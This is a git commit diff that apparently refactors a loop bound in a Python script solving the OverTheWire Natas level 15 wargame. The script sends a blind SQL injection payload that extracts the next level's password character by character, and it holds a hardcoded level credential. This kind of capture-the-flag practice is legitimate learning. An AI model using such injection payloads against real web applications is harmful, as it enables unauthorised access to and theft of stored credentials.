bfa5bb992fcaf341efe47ca2505dc42f73c0ab29
sokampdx <sokam@pdx.edu>
2014-10-26 01:11:24 -0700

    modify small changes

--- natas/natas15v2.py
+++ natas/natas15v2.py
@@ -7,8 +7,10 @@ h.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
  
 baseStr = "";
 char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+MAX = len(char)
+
 index = 0
-while index < len(char):
+while index < MAX:
 	query = urllib.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + baseStr + char[index] + "%\" ;# "))
 	resp, content = h.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
 	if ("This user exist" in str(content)):
